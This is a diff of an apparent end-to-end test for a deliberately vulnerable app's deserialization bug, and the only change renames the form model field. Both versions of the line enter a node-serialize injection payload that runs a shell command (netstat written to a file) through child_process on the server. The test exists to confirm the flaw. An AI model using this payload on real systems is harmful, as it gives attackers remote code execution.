@@ -23,7 +23,7 @@ describe('Deserialization - Deserialization Bug', function () {
             let fileName = 'deserializationBug.txt';
 
             //Fill form
-            element(by.model('shop.data.searchValue')).sendKeys("_$$ND_FUNC$$_function (){require('child_process').exec('netstat>" + fileName + "'); }()");
+            element(by.model('productSearch.searchValue')).sendKeys("_$$ND_FUNC$$_function (){require('child_process').exec('netstat>" + fileName + "'); }()");
             browser.actions().sendKeys(protractor.Key.ENTER).perform();
 
             let filePath = '../../' + fileName;
